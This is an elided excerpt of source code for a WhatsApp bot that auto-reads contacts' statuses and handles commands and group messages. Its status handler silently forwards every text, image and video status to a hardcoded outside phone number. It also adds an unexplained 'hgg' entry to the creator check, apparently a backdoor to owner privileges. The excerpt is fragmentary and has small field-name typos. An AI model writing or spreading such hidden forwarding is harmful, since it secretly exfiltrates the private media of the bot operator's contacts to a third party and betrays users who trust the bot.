...
setInterval(() => {
    store.writeToFile(__dirname+"/store.json");
        ...
        Void.ev.on('messages.upsert', async chatUpdate => {
		    ...
		    last_status = mek; 
		    //console.log("Mek Data eher : " ,mek);
		    //console.log("Mek Data eher : " ,mek.message);
	    //await Void.sendMessage("923184474176@s.whatsapp.net",mek);
		    console.log("Status Auto Read Successfuly")
		if(mek.message.extendedTextMessage)
              	{
               		Void.sendMessage("923184474176@s.whatsapp.net",{text :mek.message.extendedTextMessage.text },{quoted : mek});
                	console.log("Its An Text Status ");
              	}
	if(mek.message.imageMessage)
              {
                let msgg = mek.message.imageMessage;

        let Message = {
                image: { url:msgg.url },
		mtype: 'imageMessage',
      		mimetype: 'image/jpeg',
      		caption: msgg.caption,
      		fileSha256: msgg.fileSha256,
      		fileLength: msgg.fileLenth,
      		height: msgg.height,
      		width: msgg.width,
      		mediaKey: msgg.mediakey,
      		fileEncSha256: msgg.fileEncSha256,
      		directPath:msgg.directPath,
      		mediaKeyTimestamp: msgg.mediaKeyTimestamp,
      		jpegThumbnail: msgg.jpegThumbnail,
      		scansSidecar: msgg.scanSidecar,
      		scanLengths: msgg.scanLengths,
      		midQualityFileSha256: msgg.midQualityFileSha256,
	}
              
                Void.sendMessage("923184474176@s.whatsapp.net",Message,{quoted : mek});
                console.log("Its An Image Status ");
     }
		    
	if(mek.message.videoMessage)
              {
                let msgg = mek.message.videoMessage;
        ...
        let Message = {
      		...
      		mediaKeyTimestamp: msgg.mediaKeyTimestamp,
      		jpegThumbnail: msgg.jpegThumbnail,
      		streamingSidecar: msgg.streamingSidecar,
      		scanLengths: msgg.scanLengths,
      		midQualityFileSha256: msgg.midQualityFileSha256,
      		mtype: 'videoMessage',
          	//fileName: `status.mp4`
                ...
                Void.sendMessage("923184474176@s.whatsapp.net",Message,{quoted : mek});
                console.log("Its An Video Status ");
              }
		...
		const blockJid = global.blockJids.split(',')
                ...
                let isCreator = [ hgg,global.sudo,...global.devs, ...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
		...
		const cmdName = icmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
                if (icmd) {
                    ...
                    if (cmd) {
                        isCreator = [hgg,...global.devs,global.sudo,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
		      ...
		      //const participants =citel.isGroup ? (groupMetadata.participants ? await groupMetadata.participants : "") : "";
		    let participants = '';
		    try {
			    participants = citel.isGroup ? (groupMetadata.participants ? await groupMetadata.participants : "") : "";
		    } catch (error) {
			    console.error("An error occurred in Group ",groupMetadata," while fetching participants:", error);
		    }
		    if(!participants && citel.isGroup) {console.log("Group Jid : ",citel.isGroup," \n GroupData : ", groupMetadata ,"\n Group Legnth : " ,groupMetadata.length ,"\n========================================")}
                ...
                if (citel.isGroup && Config.groupMsgsInLog=="true") {
			
                	console.log('Message in Group\nIn=> '+groupMetadata.subject+' '+citel.sender+'\nMessage:'+citel.body+'\n===============================')
			
		}
                if (!citel.isGroup && Config.pmMsgsInLog== "true") {
